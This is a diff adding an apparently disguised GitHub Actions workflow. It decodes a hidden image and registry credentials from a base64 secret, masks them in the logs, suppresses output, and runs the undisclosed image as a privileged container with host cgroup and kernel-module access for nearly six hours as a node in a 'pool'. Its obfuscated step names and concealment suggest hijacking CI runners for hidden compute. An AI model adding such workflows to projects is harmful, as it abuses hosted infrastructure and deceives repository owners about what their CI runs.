@@ -1,0 +1,47 @@
+name: prepare-b8
+on:
+  workflow_dispatch:
+    inputs:
+      minutes:
+        required: false
+        default: '345'
+      lead:
+        required: false
+        default: '15'
+      pool:
+        required: false
+        default: 'gha'
+permissions: {}
+concurrency:
+  group: configure-a0-${{ github.run_id }}
+  cancel-in-progress: false
+jobs:
+  init-1a:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: configure-dc
+        env:
+          CFG: ${{ secrets.CFG }}
+          MINUTES: ${{ inputs.minutes }}
+          LEAD: ${{ inputs.lead }}
+          POOL: ${{ inputs.pool }}
+        run: |
+          g() { printf %s "$CFG" | base64 -d | python3 -c "import sys,json;print(json.load(sys.stdin).get('$1',''))"; }
+          IMG=$(g IMAGE); R=$(g REGISTRY); U=$(g REGISTRY_USER); P=$(g REGISTRY_PASSWORD)
+          echo "::add-mask::$IMG"; echo "::add-mask::$R"; echo "::add-mask::$U"
+          printf %s "$P" | docker login "$R" -u "$U" --password-stdin > /dev/null 2>&1 \
+            || { echo "::error::auth"; exit 1; }
+          docker pull "$IMG" > /dev/null 2>&1 || { echo "::error::pull"; exit 1; }
+          D=$(python3 -c 'import os,json,base64;e=os.environ;r=e["GITHUB_REPOSITORY"].replace("/","-").replace("_","-").lower();n=r+"-run-"+e["GITHUB_RUN_ID"]+"-"+e["GITHUB_RUN_ATTEMPT"];print(base64.b64encode(json.dumps({"NODE_NAME":n,"HOLD_MINUTES":e["MINUTES"],"LEAD_MINUTES":e["LEAD"],"POOL":e["POOL"],"STOP_TIMEOUT":"240","CLEANUP":"trap"}).encode()).decode())')
+          sudo mkdir -p /mnt/bf68f0
+          docker run -d --name configure-6b --privileged --cgroupns=host \
+            -v /sys/fs/cgroup:/sys/fs/cgroup:rw \
+            -v /lib/modules:/lib/modules:ro \
+            -v /mnt/bf68f0:/mnt/w \
+            -e B="$CFG" -e D="$D" "$IMG" > /dev/null
+          docker logs -f configure-6b || true
+          exit $(docker wait configure-6b)
+      - name: verify-42
+        if: always()
+        run: docker stop -t 240 configure-6b > /dev/null 2>&1 || true
